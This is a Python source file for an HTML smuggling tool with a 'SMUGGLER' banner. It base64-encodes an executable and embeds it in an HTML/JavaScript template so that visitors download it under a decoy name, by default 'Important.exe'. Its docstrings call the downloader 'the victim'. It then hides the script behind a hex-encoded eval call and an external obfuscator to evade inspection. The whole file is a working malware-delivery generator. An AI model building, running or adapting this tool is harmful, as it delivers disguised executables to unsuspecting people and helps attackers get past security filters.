import random
import tempfile
import subprocess
import base64
import os, sys
from jsmin import jsmin


def print_banner():
    """
    Prints the ASCII art banner at the start of the program.
    """
    banner = """
███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗ 
██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
    """
    print(banner)


def check_template_files(template_dir):
    """
    Verifies that the required template files exist in the template directory.

    :param template_dir: The directory containing the template files.
    """
    js_template = os.path.join(template_dir, "template.js")
    html_template = os.path.join(template_dir, "template.html")

    if not os.path.isfile(js_template):
        print(f"[!] Javascript template file '{js_template}' not found.")
        sys.exit(1)

    if not os.path.isfile(html_template):
        print(f"[!] HTML template file '{html_template}' not found.")
        sys.exit(1)


def ObfuscateJs(code):
    try:
        result = subprocess.run(
            ["where", "javascript-obfuscator"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True,
        )
        javascript_obfuscator_path = result.stdout.strip().splitlines()[0] + ".cmd"
    except subprocess.CalledProcessError as e:
        print(f"Error finding javascript-obfuscator: {e}")
        return None
    
    ofs_code = "window['\\x65\x76\\x61\\x6C']('{}')".format(
        "".join("\\x{:02x}".format(ord(c)) for c in code)
    )
    
    try:
        # Create temporary files for input and output
        with tempfile.NamedTemporaryFile(suffix=".js", delete=False) as temp_file:
            temp_file_path = temp_file.name
            temp_file.write(ofs_code.encode("utf-8"))

        output_path = temp_file_path.replace(".js", "_obfuscated.js")

        # Obfuscate the JavaScript code
        subprocess.run(
            [
                javascript_obfuscator_path,
                os.path.abspath(temp_file_path),
                "--output",
                os.path.abspath(output_path),
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )

        # Read the obfuscated code from the output file
        with open(output_path, "r") as output_file:
            obfuscated_code = output_file.read()

        # Clean up temporary files
        os.remove(os.path.abspath(temp_file_path))
        os.remove(os.path.abspath(output_path))

        return obfuscated_code
    except subprocess.CalledProcessError as e:
        print(f"Error during obfuscation: {e}")
        return None
    except Exception as e:
        print(f"Unexpected error: {e}")
        return None


def generate_html(
    executable_path,
    output_filename,
    download_as_filename="Important.exe",
):
    """
    Generates an HTML file that includes the Base64 encoded data
    of the specified executable file.

    :param executable_path: Path to the executable file
    :param output_filename: Name of the output HTML file
    :param download_as_filename: The filename shown to the victim when downloading
    """
    try:
        # Read the binary data from the executable file
        with open(executable_path, "rb") as exe_file:
            binary_data = exe_file.read()
    except FileNotFoundError:
        print(f"[!] Executable file '{executable_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading '{executable_path}': {e}")
        sys.exit(1)

    # Base64 encode the binary data
    encoded_data = base64.b64encode(binary_data).decode("utf-8")

    html_template_path = os.path.join(
        os.path.dirname(__file__), "template", "template.html"
    )
    js_template_file = os.path.join(
        os.path.dirname(__file__), "template", "template.js"
    )

    try:
        # Read the HTML and JS templates
        with open(html_template_path, "r") as html_template_file:
            html_template_content = html_template_file.read()
        with open(js_template_file, "r") as js_template_file:
            js_template_content = js_template_file.read()
    except FileNotFoundError as e:
        print(f"[!] Template file '{e.filename}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading template file: {e}")
        sys.exit(1)

    # Replace placeholders in the template with the encoded data and the victim filename
    js_content = js_template_content.replace("{encoded_data}", encoded_data)
    js_content = js_content.replace("{filename}", download_as_filename)

    # Obfuscate the JavaScript content
    minified_js_content = jsmin(js_content)
    obfuscated_js_content = ObfuscateJs(minified_js_content)

    html_content = html_template_content.replace(
        "{JAVASCRIPT_CONTENT_GOES_HERE}", obfuscated_js_content
    )

    try:
        # Write the modified HTML content to the output file
        with open(output_filename, "w") as output_file:
            output_file.write(html_content)
    except Exception as e:
        print(f"[!] Error writing to '{output_filename}': {e}")
        sys.exit(1)
